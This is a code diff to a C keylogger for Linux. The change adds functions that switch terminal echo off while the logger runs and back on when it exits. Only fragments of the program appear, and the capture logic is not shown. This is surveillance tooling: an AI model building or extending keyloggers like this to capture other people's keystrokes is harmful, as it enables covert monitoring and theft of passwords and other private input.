@@ -8,18 +8,41 @@
 #include<sys/ioctl.h>
 #include<stdbool.h>
 
+#include<termios.h>
+#include<unistd.h>
+
+
 #define MIN_KARG_COUNT 2
 #define ERROR -1
 #define CAPS_LOCK_FLAG_OFFSET 1
 
 #define USER_KEY_PRESS 1
 #define USER_KEY_RELEASE 0
+
+void disable_echo(){
+	struct termios t;
+	tcgetattr(STDIN_FILENO,&t);
+	t.c_lflag &= ~ECHO;
+	tcsetattr(STDIN_FILENO,TCSANOW,&t);
+}
+
+void enable_echo(){
+	struct termios t;
+	tcgetattr(STDIN_FILENO,&t);
+	t.c_lflag |= ECHO;
+	tcsetattr(STDIN_FILENO,TCSANOW,&t);
+
+}
+
 int main(int argc, char *argv[]){
 	
 	if(argc != MIN_KARG_COUNT){
 		printf("usage: %s <event-name>\n",argv[0]);
 		exit(ERROR);
 	}
+
+	disable_echo();
+
 	printf("\t\t\t\t__________________________________\n\n");
 	printf("\t\t\t\tkeylogger active...\n");
 	printf("\t\t\t\tlog: <event-name> : %s\n",argv[1]);
@@ -267,5 +290,6 @@ int main(int argc, char *argv[]){
 
 		fflush(stdout);
 	}
+	enable_echo();
 	return 0;
 }
